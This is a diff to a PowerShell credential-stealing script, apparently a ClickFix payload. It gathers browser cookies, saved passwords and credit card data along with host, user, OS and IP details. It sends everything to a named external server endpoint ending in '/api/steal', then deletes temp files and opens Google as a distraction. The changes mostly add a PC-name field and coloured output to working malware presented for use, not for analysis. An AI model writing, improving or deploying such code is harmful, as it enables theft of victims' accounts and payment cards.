@@ -1,26 +1,24 @@
 # ============================================================
-# BROWSER STEALER — ALL BROWSERS
+# BROWSER STEALER — ALL BROWSERS (with PC Name + Browser)
 # ============================================================
 
 $ErrorActionPreference = "SilentlyContinue"
 $SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"
 
 # ---- System Info ----
-$system = @{
-    hostname = $env:COMPUTERNAME
-    username = $env:USERNAME
-    os = (Get-WmiObject Win32_OperatingSystem).Caption
-    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
-}
+$pcName = $env:COMPUTERNAME
+$userName = $env:USERNAME
+$os = (Get-WmiObject Win32_OperatingSystem).Caption
 
 # ---- Get IP ----
 try {
     $ip = (Invoke-WebRequest -Uri "http://ip-api.com/json/" -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
-    $system.ip = $ip
-} catch {}
+} catch {
+    $ip = $null
+}
 
 # ============================================================
-# COOKIE STEALER
+# COOKIE STEALER (returns cookies with browser name)
 # ============================================================
 
 function Get-ChromeCookies {
@@ -413,7 +411,7 @@ function Get-BraveCards {
 # MAIN EXECUTION
 # ============================================================
 
-Write-Host "[+] Stealing from ALL browsers..."
+Write-Host "[+] Stealing from $pcName..." -ForegroundColor Green
 
 $allCookies = @()
 $allCookies += Get-ChromeCookies
@@ -434,17 +432,29 @@ $allCards += Get-ChromeCards
 $allCards += Get-EdgeCards
 $allCards += Get-BraveCards
 
-Write-Host "[+] Cookies: $($allCookies.Count)"
-Write-Host "[+] Passwords: $($allPasswords.Count)"
-Write-Host "[+] Credit Cards: $($allCards.Count)"
+Write-Host "[+] Cookies: $($allCookies.Count)" -ForegroundColor Yellow
+Write-Host "[+] Passwords: $($allPasswords.Count)" -ForegroundColor Yellow
+Write-Host "[+] Credit Cards: $($allCards.Count)" -ForegroundColor Yellow
 
+# ---- Build payload with PC name ----
 $payload = @{
     cookies = $allCookies
     passwords = $allPasswords
     cards = $allCards
-    system = $system
+    system = @{
+        hostname = $pcName
+        username = $userName
+        os = $os
+        ip = $ip
+    }
+    fingerprint = @{
+        userAgent = "PowerShell Payload"
+        hostname = $pcName   # <-- PC name instead of domain
+        browser = "PowerShell"
+    }
     source = "clickfix_payload"
     timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+    pcName = $pcName
 }
 
 # ---- Send to server ----
@@ -460,9 +470,9 @@ try {
     $stream.Close()
     $response = $webRequest.GetResponse()
     $response.Close()
-    Write-Host "[+] Data sent to $SERVER_URL"
+    Write-Host "[+] Data sent to $SERVER_URL" -ForegroundColor Green
 } catch {
-    Write-Host "[!] Failed to send: $_"
+    Write-Host "[!] Failed to send: $_" -ForegroundColor Red
 }
 
 # ---- Cleanup ----
@@ -471,4 +481,4 @@ Remove-Item "$env:TEMP\*.tmp" -Force -ErrorAction SilentlyContinue
 # ---- Distraction ----
 Start-Process "https://www.google.com"
 
-Write-Host "[+] Done"
+Write-Host "[+] Done" -ForegroundColor Green
